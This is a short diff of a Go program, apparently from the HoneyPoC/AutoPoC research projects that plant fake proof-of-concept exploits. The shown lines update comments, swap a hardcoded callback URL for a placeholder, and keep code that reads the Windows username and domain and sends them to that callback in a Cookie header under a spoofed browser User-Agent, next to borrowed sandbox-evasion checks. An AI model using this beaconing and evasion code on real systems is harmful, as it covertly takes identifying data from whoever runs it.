@@ -1,7 +1,7 @@
-// Massive Work in Progress
+// Massive Work in Progress -Built off the back of AutoPoC and HoneyPoC projects
 // Eventual plan is to have a reverse blacklist of various paths, users and hostnames, if the data matches then run the code, else no hax
-// ZephrFish 2021
-// v0.2
+// ZephrFish 2022
+// v0.3
 // Sandbox Checks taken from https://github.com/redcode-labs/Coldfire
 // Additional sandbox checks added in following structure
 
@@ -279,7 +279,7 @@ func main() {
 	client := &http.Client{}
 
 	// Update this to match whatever callback URL we decide on
-	CallBack := "http://cve.honeypoc.io/content/cegfakzxun8xpxy31z81ur0eo/logo.gif"
+	CallBack := "CHANGEME"
 
 	var envDomain string = os.Getenv("USERDOMAIN")
 	var envUsername string = os.Getenv("USERNAME")
@@ -296,7 +296,8 @@ func main() {
 	if err != nil {
 		log.Fatalln(err)
 	}
-
+	
+	// We can change this to whatever we want
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36")
 	req.Header.Set("Cookie", str)
 	// req.Header.Set("X-Target-IP", TargetIP)
